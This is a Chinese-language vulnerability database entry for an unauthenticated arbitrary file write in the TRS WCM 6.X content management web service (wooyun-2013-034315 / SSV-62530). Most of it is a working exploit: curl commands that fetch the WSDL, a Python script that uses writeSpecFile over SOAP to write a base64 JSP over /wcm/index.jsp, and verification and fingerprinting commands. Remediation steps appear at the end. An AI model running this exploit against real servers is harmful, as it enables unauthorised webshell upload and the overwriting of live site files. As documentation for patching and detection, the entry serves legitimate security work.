---
id: TRS-WCM-WEBSERVICE-FILE-WRITE
title: TRS WCM 6.X WebService templateservicefacade 任意文件写入漏洞（wooyun-2013-034315 / SSV-62530）
product: trs-wcm
vendor: 北京拓尔思信息技术股份有限公司
version_affected: "6.0-6.5（WCM 6.X 系列，6.5 已验证）"
severity: CRITICAL
tags: [rce, file_upload, 未授权访问, webshell, 国产]
fingerprint: ["TRS WCM", "wcm", "拓尔思"]
---

## 漏洞描述

TRS WCM 内容协作平台（拓尔思内容管理系统）的 Web Service（`/wcm/services`）中，`trs:templateservicefacade` 服务提供 `writeFile` / `writeSpecFile` 操作，未做访问控制。匿名攻击者可向服务器写入内容（base64 编码）与自定义文件名/绝对路径的文件，直接写入 JSP 文件即可获取 webshell。

- `writeFile(文件内容 base64, 文件后缀名)`：返回物理路径，不覆盖已存在文件（Windows 版本可用 `../` 跳目录）
- `writeSpecFile(文件内容 base64, 文件绝对路径)`：写入指定绝对路径，会覆盖原文件
- 常见写入位置：`/wcm/index.jsp`、`/wcm/demo/index.jsp`、`/wcm/include/login.jsp`

该漏洞 2013-08 由乌云公开（wooyun-2013-034315），厂商当日确认并于 2013-08 完成修复；Seebug SSV-62530 记录 WCM 6.5 `/wcm/services/trs:templateservicefacade` 任意文件创建。

## 影响版本

- TRS WCM 6.X 系列（6.1、6.5 等版本已确认受影响；5.x 是否受影响未在公开记录中明确）

## 前置条件

- 无需认证，Web Service（`/wcm/services`）对外可访问
- 目标部署目录可写（Tomcat 默认 webapps 目录）

## 利用步骤

1. 获取 WSDL，确认服务与操作名：`curl http://target/wcm/services/trs:templateservicefacade?wsdl`
2. 构造 SOAP 请求调用 `writeSpecFile`（或 `writeFile`），参数为 base64 编码的文件内容 + 写入路径/后缀
3. 访问写入的 JSP 文件确认 webshell 生效

## Payload

```bash
# 1) 查看 WSDL 确认命名空间与操作参数名
curl -s "http://target/wcm/services/trs:templateservicefacade?wsdl"
```

```python
# 2) Python 调用 writeSpecFile 写入 JSP（命名空间以目标 WSDL 实际值为准）
import base64
import re
import requests

base = "http://target/wcm"
wsdl_url = base + "/services/trs:templateservicefacade?wsdl"

r = requests.get(wsdl_url, timeout=10)
ns = re.search(r'targetNamespace="([^"]+)"', r.text).group(1)

shell_b64 = base64.b64encode(b'<%out.println("TRS_WCM_TEST");%>').decode()
body = f'''<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:trs="{ns}">
  <soapenv:Body>
    <trs:writeSpecFile>
      <arg0>{shell_b64}</arg0>
      <arg1>/usr/local/tomcat/webapps/wcm/index.jsp</arg1>
    </trs:writeSpecFile>
  </soapenv:Body>
</soapenv:Envelope>'''

requests.post(wsdl_url.replace("?wsdl", ""), data=body,
              headers={"Content-Type": "text/xml; charset=UTF-8", "SOAPAction": ""})
```

## 验证方法

```bash
# 访问写入的 JSP 文件，若输出 TRS_WCM_TEST 即写入成功
curl -s "http://target/wcm/index.jsp"
```

## 指纹确认

```bash
curl -s "http://target/wcm/" | grep -i "TRS\|拓尔思\|wcm"
curl -s -o /dev/null -w "%{http_code}" "http://target/wcm/services/trs:templateservicefacade?wsdl"
```

## 修复建议

1. 升级/应用厂商安全补丁（2013-08 后已修复）
2. 对 `/wcm/services` Web Service 增加认证与访问控制，或直接下线
3. 移除 `writeFile` / `writeSpecFile` 等写文件操作

## 参考

- 乌云 wooyun-2013-034315（TRS WCM 6.X 系统任意文件写入漏洞，厂商确认）
- Seebug SSV-62530（TRS WCM 6.5 /wcm/services/trs:templateservicefacade 任意文件创建）
- TRS 漏洞整理: https://www.pa55w0rd.online/trs/index.html

> 产品线说明：本条目仅针对 TRS WCM 内容协作平台（拓尔思内容管理系统），与「TRS 媒资管理系统」（Vuln/web/trs/TRS-TEST-RCE.md）是不同产品线，不可相互改名或加 alias。
